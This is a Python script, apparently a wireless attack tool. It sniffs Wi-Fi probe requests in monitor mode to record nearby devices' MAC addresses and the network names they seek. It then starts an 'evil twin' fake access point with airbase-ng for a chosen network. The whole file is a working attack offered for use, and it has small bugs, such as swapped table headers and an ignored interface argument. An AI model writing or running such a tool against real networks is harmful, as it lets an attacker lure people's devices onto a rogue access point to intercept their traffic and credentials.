import argparse
import os
import subprocess
import threading
import time
from scapy.all import *
from tabulate import tabulate

interface = "wlan0"
stop_hopper = False
probes = {}

def set_interface_mode(interface, mode):
    os.system(f"sudo ip link set {interface} down")
    result = os.system(f"sudo iw {interface} set type {mode}")
    if result != 0:
        print(f"Failed to set {interface} to {mode} mode.")
    os.system(f"sudo ip link set {interface} up")


def set_monitor_mode(interface):
    set_interface_mode(interface, "monitor")

def set_managed_mode(interface):
    set_interface_mode(interface, "managed")


def channel_hopper():
    global stop_hopper
    while not stop_hopper:
        for channel in range(1, 14):  # 2.4 GHz channels (1-13)
            if stop_hopper:
                break
            os.system(f"iw dev {interface} set channel {channel}")
            time.sleep(1)

def callback(packet):
    if packet.haslayer(Dot11ProbeReq):
        ssid = packet[Dot11Elt].info.decode()
        client_mac = packet[Dot11].addr2
        if client_mac not in probes:
            print(f"Detected device {client_mac} probing for {ssid}")
            probes[client_mac] = ssid

def create_evil_twin(ssid, interface):
    print(f"Creating evil twin for {ssid}...")
    process = subprocess.Popen(["sudo", "airbase-ng", "-e", ssid, "-c", "6", interface])
    print(f"Evil twin for {ssid} created. Press Ctrl+C to stop the access point.")
    
    try:
        process.wait()
    except KeyboardInterrupt:
        print("\nTerminating evil twin...")
        process.terminate()
        process.wait()
        print("Evil twin terminated.")


def main(monitor_interface):
    set_monitor_mode(interface)
    print("Scanning for devices trying to connect to any SSID...")

    hopper_thread = threading.Thread(target=channel_hopper)
    hopper_thread.daemon = True
    hopper_thread.start()

    try:
        sniff(iface=interface, prn=callback, store=False)
    except KeyboardInterrupt:
        pass

    print("\nScan completed")
    set_managed_mode(interface)
    print("Changing to managed mode...")
    time.sleep(3) # Wait for 1 second for the interface to switch to monitor mode
    print("Scanning for devices trying to connect to any SSID...")

    headers = ["SSID", "Device MAC"]
    print(tabulate([[k, v] for k, v in probes.items()], headers=headers))

    target_ssid = input("Enter the SSID you want to create an evil twin for (q to quit): ")
    if target_ssid.lower() != "q":
        create_evil_twin(target_ssid, interface)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Detect devices looking for any SSID.")
    parser.add_argument("interface", type=str, help="The monitor mode interface to scan for probes")
    parser.add_argument("--ssid", type=str, help="Optional: The target SSID to scan for", default=None)
    args = parser.parse_args()

    main(args.interface)
